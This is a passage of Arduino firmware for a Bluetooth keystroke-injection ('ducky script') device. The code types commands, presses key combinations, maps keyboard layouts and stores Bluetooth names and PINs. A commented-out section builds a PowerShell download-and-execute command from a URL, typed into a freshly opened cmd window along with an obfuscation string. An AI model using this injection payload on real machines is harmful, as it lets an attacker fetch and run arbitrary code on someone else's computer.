    if(IsCmd(inStr, "PT:")){                     // plain text
        ExtractDeliveredText(inStr, 3);
        Print(inStr);
        delay(default_delay);
    }
    
    if(IsCmd(inStr, "TE:")){                     //(direct text instruction but with enter at the end )    
        ExtractDeliveredText(inStr, 3);
        Print(inStr);
        delay(20);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.release(KEY_RETURN);   
    }
    
    if(IsCmd(inStr ,"ML:")){                     // enable/disable multi lang method
        ExtractDeliveredText(inStr, 3);
        if(!strcmp(inStr,"Enabled")){
          useMultiLangWindowsMethod = true;
          EEPROM.put(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, true);
        }
        else if(!strcmp(inStr,"Disabled")){
          useMultiLangWindowsMethod = false;
          EEPROM.put(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, false);
        }
    }
      
    if(IsCmd(inStr, "ENC,")){SetNewCharEncoding(inStr);}

    // ducky script                                    
    //*  PDK_HC:FF,a,end    // Press double key: hex + char
    //*  PDK_HH:FF,FF,end   // Press double key: hex + hex
    //*  PK:a,end  // Press key char
    //*  PKH:FF,end // Press key hex
    //*  WAIT:5000,end // delay(5000);
    //*  PTK_HHH:FF,FF,a,end // Press triple key: hex + hex + char
    
    if(IsCmd(inStr, "PDK_HC:")){                   // press double key (when hex and char received)            
        ExtractDeliveredText(inStr, 7);
        inStr[4] = 0;
        Keyboard.press(HexToChar(inStr));
        delay(keypress_time);
        //Print(inStr[3]);
        Keyboard.press(inStr[3]);
        delay(keypress_time);
        Keyboard.releaseAll(); 
        delay(default_delay);
    }
    
    if(IsCmd(inStr, "PDK_HH:")){                   // press double key ( when hex and hex values received)         
        ExtractDeliveredText(inStr, 7);        
        int key_1;
        int key_2;
        sscanf(inStr, "%X,%X", &key_1, &key_2);   
        Keyboard.press(key_1);
        delay(keypress_time);
        Keyboard.press(key_2);
        delay(keypress_time);
        Keyboard.releaseAll();  
        delay(default_delay);
    }

  if(IsCmd(inStr, "PTK_HHC:")){                  // Press triple key: hex + hex + char (e.g. CTRL ALT t - to open terminal on Ubuntu)     
        int key_1;
        int key_2;
        int key_3;
        sscanf(inStr, "%*[^:]:%X,%X,%c", &key_1, &key_2, &key_3);   
        Keyboard.press(key_1);
        delay(keypress_time);
        Keyboard.press(key_2);
        delay(keypress_time);
        Keyboard.press(key_3);
        delay(keypress_time);
        Keyboard.releaseAll();  
        delay(default_delay);
    }

    if(IsCmd(inStr, "PK:")){                       // press key
        ExtractDeliveredText(inStr, 3);
        inStr[1] = 0;
        Print(inStr[0]);
        delay(keypress_time);
        delay(default_delay);
    }
    
    if(IsCmd(inStr, "PKH:")){                      // press key (when hex received)
        ExtractDeliveredText(inStr, 4);
        char key[2] = {HexToChar(inStr), '\0'};
        Print(key);  
        delay(default_delay);  
    }
    
    if(IsCmd(inStr, "DELAY:")){
        //ExtractDeliveredText(inStr, 5);
        int val;
        sscanf(inStr, "%*[^:]:%d", &val);
        delay(val);    
        delay(default_delay);
    }

    if(IsCmd(inStr, "DEFAULTDELAY:") || IsCmd(inStr, "DEFAULT_DELAY:")){
        sscanf(inStr, "%*[^:]:%d", &default_delay); 
        delay(default_delay);
    }

    if(!strcmp(inStr, "ds_begin") || !strcmp(inStr, "ds_end")){ // when ducky script begins
      default_delay = 0;      
    }

    // END OF DUCKY SCRIPT COMMANDS


    /*
    
    if(IsCmd(inStr, "SW:") && StrContains(inStr, ",type:")){         //SW:t,type:est,end (download and set as a wallpaper)
        byte indexType = SubStrIndex(inStr, ",type:");                                                        //trying to get the position where link is ending and the file type begins
        byte indexEnd = SubStrIndex(inStr, ",end");                                                           //trying to get the position where the file type ends (to know its length)
        char fileFormat[10];
        byte typeLen = indexEnd - (indexType + strlen(",type:")); //get length
        for(byte i=0;i<=typeLen;i++){
          fileFormat[i] = inStr[i+indexType+strlen(",type:")];
          if(i == typeLen){fileFormat[i] = '\0';}
        }
        for(byte i=0;i<=indexType-3;i++){                               //indexType - 3 which is "SW:" + 1
          inStr[i] = inStr[i+3];
          if(i == indexType-3){inStr[i] = '\0';}
        }    
        OpenCmd(); //("powershell Start-Process cmd -Verb runAs");
        delay(500);
        EnterCommand(commandLineObfuscationString);
        Print("powershell \"$down = New-Object System.Net.WebClient; $url = '");
        Print(inStr);
        Print("'; $file = 'downloadedfile.");
        Print(fileFormat);
        Print("'; $down.DownloadFile($url,$file); exit;\" & reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Users\\%USERNAME%\\downloadedfile.");
        Print(fileFormat);
        Print(" /f & RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters & exit");
        TypeKey(KEY_RETURN);
    }



      // powershell \"$down = New-Object System.Net.WebClient; $url = '
      // url
      // '; $file = 'downloadedfile.
      // format
      // '; $down.DownloadFile($url,$file); exit;\" & reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Users\\%USERNAME%\\downloadedfile.
      // format
      //  /f & RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters & exit
      // ENTER

      
    if(IsCmd(inStr, "DE:") && StrContains(inStr, ",type:")){                     //DE:t,type:est,end (download and execute)
        byte indexType = SubStrIndex(inStr, ",type:");                              //trying to get the position where link is ending and the file type begins
        byte indexEnd = SubStrIndex(inStr, ",end");                             //trying to get the position where the file type ends (to know its length)
        char fileFormat[10];
        byte typeLen = indexEnd - (indexType + strlen(",type:"));         //get length
        for(byte i=0;i<=typeLen;i++){    
          fileFormat[i] = inStr[i+indexType+strlen(",type:")];
          if(i == typeLen){fileFormat[i] = '\0';}
        }
        for(byte i=0;i<=indexType-3;i++){                                   //indexType - 3 which is "DE:" + 1
          inStr[i] = inStr[i+3];
          if(i == indexType-3){inStr[i] = '\0';}
        }    
        OpenCmd(); //("powershell Start-Process cmd -Verb runAs");
        delay(500);
        EnterCommand(commandLineObfuscationString);
        
        Print("powershell \"$down = New-Object System.Net.WebClient; $url = '");
        Print(inStr);
        Print("'; $file = 'downloadedfile.");
        Print(fileFormat);
        Print("'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;\" & exit");
        TypeKey(KEY_RETURN);
  }

  // powershell "$down = New-Object System.Net.WebClient; $url = '
  // url
  // '; $file = 'downloadedfile.
  // format
  // '; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;\" & exit

*/


  if(IsCmd(inStr, "CBN:")){                     //CBN:supremeDuck,end (change bluetooth name, after next reboot)
      ExtractDeliveredText(inStr, 4);
      char bluetoothName[BLUETOOTH_NAME_SIZE] = {0};
      sprintf(bluetoothName, "%s\0", inStr);
      
      EEPROM.put(EEPROM_ADDRESS_BLUETOOTH_NAME, bluetoothName); 
      EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_NAME_CHANGE, 777);   
  }

  if(IsCmd(inStr, "CBP:")){                     //CBP:3737,end (change bluetooth 4-digit pin, after next reboot)
      ExtractDeliveredText(inStr, 4);
      char pin[5] = {0};
      sprintf(pin, "%s\0", inStr);
      
      EEPROM.put(EEPROM_ADDRESS_BLUETOOTH_PIN, pin); 
      EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLUETOOTH_PIN_CHANGE, 777);   
  }

  if(IsCmd(inStr, "CBLEN:")){                     //CBN:supremeDuck,end (change BLE name, after next reboot)
      ExtractDeliveredText(inStr, 6);
      char bleName[BLE_NAME_SIZE] = {0};
      sprintf(bleName, "%s\0", inStr);
      
      EEPROM.put(EEPROM_ADDRESS_BLE_NAME, bleName); 
      EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLE_NAME_CHANGE, 777);   
  }

  if(IsCmd(inStr, "CBLEP:")){                     //CBP:373737,end (change BLE 6-digit pin, after next reboot)
      ExtractDeliveredText(inStr, 6);
      char pin[7] = {0};
      sprintf(pin, "%s\0", inStr);
      
      EEPROM.put(EEPROM_ADDRESS_BLE_PIN, pin); 
      EEPROM.put(EEPROM_ADDRESS_REQUESTED_BLE_PIN_CHANGE, 777);   
  }
    
  memset(inStr, 0, MAX_SERIAL_LENGTH);
}

/*
ENC,D:2122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F40414D5157595A5B5C5D5E5F6061696D7177797A7B7C7D7E,end
ENC,U:317E333435373238392D345C3D2F37303132333435363738392F5C2C302E2D71616D7177797A382D39333D5C61226D7177797A375C305D,end
ENC,M:81008686818181818100810000008100000000000000000000818181818181868181818181818686868181860000000000000086818686,end
ENC,N:UK - gb,end
*/

void ExtractDeliveredText(char *inStr, byte ignoredStartingChars)             //gets rid of the first few chars (e.g. "YT:") and the ",end" (it assumes that every message received ends with ",end", if the message would end like ",ending" the function won't work properly without adding additional parameter, somthing like: "byte ignoredEndingChars")
{
  byte len = SubStrIndex(inStr, ",end") - ignoredStartingChars;      
   
  for(byte i=0;i<=len;i++)
  {
    inStr[i] = inStr[i+ignoredStartingChars];
    if(i == len)
    {
      inStr[i] = '\0';
    }
  }
}

int SubStrIndex(char *str, char *sfind)
{ 
  int ptr = strstr(str, sfind);
  if(ptr){
    return ptr - (int)str;
  }
  return 0;
}



bool IsCmd(char *str, char *cmdStart){
  return (StrStartsWith(str, cmdStart) && StrEndsWith(str, ",end"));
}

bool StrContains(char *str, char *sfind)
{
    return (bool)(strstr(str, sfind));
}

bool StrStartsWith(char* str, char* desiredStart)
{
  return (bool)(strstr(str, desiredStart) == str);
}

bool StrEndsWith(char* str, char* desiredEnd)
{
  return (bool)(strstr(str, desiredEnd) == (str + strlen(str) - strlen(desiredEnd)));
}



void Print(char *inStr)
{   
  int enc_index; 
  for(byte i=0; i<strlen(inStr); i++)               //for each character in the string
  {  
    if (useMultiLangWindowsMethod && !IsModifier(inStr[i]) && ((!isalnum(inStr[i]) && inStr[i] != ' ') || IsException(inStr[i])))       //if character is punctuation or requires different button to be pressed in different keyboard language settings then use alt+numpad method
    {
      //Serial.print("special char = ");
      //Serial.println(inStr[i]);
      
      byte hundreds = (byte)inStr[i] / 100;
      byte dozens = ((byte)inStr[i] - (hundreds*100)) / 10;
      byte singles = (byte)inStr[i] - (hundreds*100) - (dozens*10);

      /*
      Serial.print(hundreds);
      Serial.print(dozens);
      Serial.println(singles);
      */
    
      Keyboard.press(KEY_LEFT_ALT);
      PressRelease((char)KEYPAD[hundreds], default_delay);
      PressRelease((char)KEYPAD[dozens], default_delay);
      PressRelease((char)KEYPAD[singles], default_delay);
      Keyboard.releaseAll();
      continue;
    }
  
    enc_index = GetKeyIndex(inStr[i], Encoding[ENCODING_BYTE_DESIRED]);
    if(enc_index < 256 && !IsModifier(inStr[i]))                            //256 means it's a key not present in the array (key which does not need a substitution because it is the same for any keyboard setting)
    {    
      if(Encoding[ENCODING_BYTE_MODIFIER][enc_index] > 0)
      {
        Keyboard.pressRawModifier(Encoding[ENCODING_BYTE_MODIFIER][enc_index]);
        delay(keypress_time);
      }

      Keyboard.pressRaw(Encoding[ENCODING_BYTE_USED][enc_index]);
      delay(keypress_time);     

      /*
      Serial.print(inStr[i]);
      Serial.print(", ");
      Serial.print(Desired_Keys[enc_index]);
      Serial.print(", ");
      Serial.print(Modifier_Keys[enc_index]);
      Serial.print(", ");
      Serial.print(Used_Keys[enc_index]);
      Serial.print(", ");
      Serial.print("\n");
      */
      
    }
    else // if the standard/normal key can be pressed
    {
      Keyboard.press(inStr[i]);
      
      //Serial.print(", ");
      //Serial.println(inStr[i]);
      delay(keypress_time);     
    }
    Keyboard.releaseAll();
  }
}

int GetKeyIndex(byte c, byte* char_array)           // find and the position of the value in the array
{
  for(byte i=0;i<strlen(char_array);i++)
  {
    if(c == char_array[i])
    {
      return i;
    }
  }
  return 256;
}

void PressRelease(char c, byte timeDelay)
{
  Keyboard.press(c);
  delay(timeDelay);
  Keyboard.release(c);
}


/*
Exceptions are the letters that require different button being pressed in different lang settings 
(so if letter == exception then use alt+numpad method, otherwise use the normal typing because it's faster to press 1 instead of 4 buttons) 
these exceptions are listed to make the typing process faster because using alt+numpad method for all the characters appears to be too slow

german - yz
french - qamwz
dutch - qamwz
turkish - i
azerbaijani - totally uncompatible
*/

#define EXCEPTIONS_SIZE 24
char exceptions[EXCEPTIONS_SIZE] = {
  'y','Y',
  'z','Z',
  'q','Q',
  'a','A',
  'm','M',
  'w','W',
  'i','I',
  '0','1','2','3','4','5','6','7','8','9',
};


bool IsException(char c)                    // check whether this character is one of these that have to be typed differently using other language settings
{
  for(byte i=0; i<EXCEPTIONS_SIZE; i++)
  {
    if(c == exceptions[i])
    {
      return true;
    }
  }
  return false;
}


bool IsModifier(char c)                   // is key like shift, alt, "GUI" key, etc.
{
  byte b = (byte)c;
  if((b >= 128 && b <=135) || (b >= 176 && b <=179) || (b >= 193 && b <=205) || (b >= 209 && b <=218))
  {
    return true;
  }
  return false;
}

char HexToChar(char *inStr)                   // function which takes a pointer to a string with 2 characters like "FF" as a parameter and returns a number converted from that string, interpretting it as a 2 digit hexadecimal value 
{
  char strValBuff[3]={inStr[0],inStr[1],'\0'}; 
  return (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
}


void SetNewCharEncoding(char *inStr){
  byte encodingFactor=255;
  switch (inStr[4])                                                 //5th letter is D, U or M depending on the type of 3 encoding factors
  {
    /*
     * the encoding data is large so the app sends the data in 4 steps, first sends the desired characters, the ones that the user wants to type (marked by the letter "D")
     * then it sends the used characters, the ones that have to be "pressed" in order to type the desired characters while using a specific language settings (these "Used characters" are marked by the letter "U")
     * then it sends the modifier keys, they are used to know whether some shift or alt has to be pressed together with the "Used char" to achieve "Desired char" being typed on the target PC  
     * the last message sent is just a name of the language (e.g. UK - gb)
     * 
     * Let's pretend that I want to type the letter "n" which is 0x6D in ascii table. Let's assume hypothetically that in order to type that letter on a PC with a Japanese keyboard setting
     * I have to press "z" + shift that are respectively 0x7A in ascii table and 0x81 (according to not ascii table but this: https://www.arduino.cc/en/Reference/KeyboardModifiers)
     * The encoding data which will allow me to correctly type letter "c" in such case would be:
     * ENC,D:6D,end
     * ENC,U:7A,end
     * ENC,M:81,end
     * ENC,N:HypotheticalJapanese - hj,end
     * 
     * The above example would send the data required for 1 char, the implementation of this system sends no more than 72 bytes/chars at once.
     */
    case 'D': 
      {
        encodingFactor=0;
      }     
      break;
      
    case 'U':
      {
        encodingFactor=1;  
      }
      break;
    case 'M':
      {
        encodingFactor=2; 
      }
      break;
    case 'N':
      {
        ExtractDeliveredText(inStr, 6);
        sprintf(encodingName, "%s\0", inStr);
        EEPROM.put(EEPROM_STARTING_ADDRESS_ENCODING_NAME, encodingName);
        EEPROM.put(EEPROM_ADDRESS_ENCODING_AVAILABLE, 778);                     //just to acknowledge that there's no need for the default US encoding becuase some other was saved to EEPROM
        for(byte i=0;i<MAX_SERIAL_LENGTH;i++){inStr[i]=0;}
        return;
      }
      break;
    default:
      {
        Serial.print("Error: Incorrect encoding factor.");
        return;
      }
      break;
  }   

  ExtractDeliveredText(inStr, 6);
  

  for(byte offset=0; offset<strlen(inStr); offset+=2)
  {
    byte strValBuff[3]={inStr[offset],inStr[offset+1],'\0'}; 

    Encoding[encodingFactor][offset/2] = (byte)strtoul((char*)strtok(strValBuff, " "),NULL,16);               //(((byte)inStr[offset]) * 16) + (byte)inStr[offset+1];         

  }  

  //save to EEPROM
  for(byte offset=0; offset<ENCODING_SIZE; offset++)
  {
    Encoding[encodingFactor][offset] = ((offset<(strlen(inStr)/2)) ? Encoding[encodingFactor][offset] : 0);
    EEPROM.put(offset+1+(ENCODING_SIZE*encodingFactor), Encoding[encodingFactor][offset]);                    //+1 because the 0 address holds trigger bool for tricky activation method
    
  }
}
